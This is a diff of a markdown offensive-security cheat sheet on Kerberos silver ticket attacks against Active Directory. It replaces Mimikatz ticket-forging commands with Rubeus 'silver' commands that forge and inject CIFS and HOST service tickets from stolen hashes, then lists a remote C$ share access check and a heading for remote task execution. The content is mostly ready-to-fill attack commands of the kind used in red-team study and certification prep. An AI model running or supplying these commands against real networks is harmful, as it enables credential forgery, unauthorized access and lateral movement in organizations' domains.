@@ -52,22 +52,23 @@ Get-wmiobject -Class win32_operatingsystem -ComputerName <COMPUTERNAME>
 
 ## Silver ticket
 - https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets
+- By default, computer passwords change every 30 days
 
 #### Make silver ticket for CIFS service
 - Use the hash of the local computer
 - Other services are HOST, RPCSS, WSMAN
 ```
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /target:<TARGET> /service:CIFS /rc4:<LOCAL COMPUTER HASH> /user:Administrator /ptt"'
+.\Rubeus.exe silver /service:<CIFS>/<FQDN> /aes256:<AES> /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN SID> /ptt
 ```
 
-#### Check access (After CIFS silver ticket)
+#### Check access 
 ```
 ls \\<SERVERNAME>\c$\
 ```
 
 #### Make silver ticket for Host service
 ```
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /target:<TARGET> /service:HOST /rc4:<LOCAL COMPUTER HASH> /user:Administrator /ptt"'
+.\Rubeus.exe silver /service:<HOST>/<FQDN> /aes256:<AES> /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN SID> /ptt
 ```
 
 #### Schedule and execute a task (After host silver ticket)
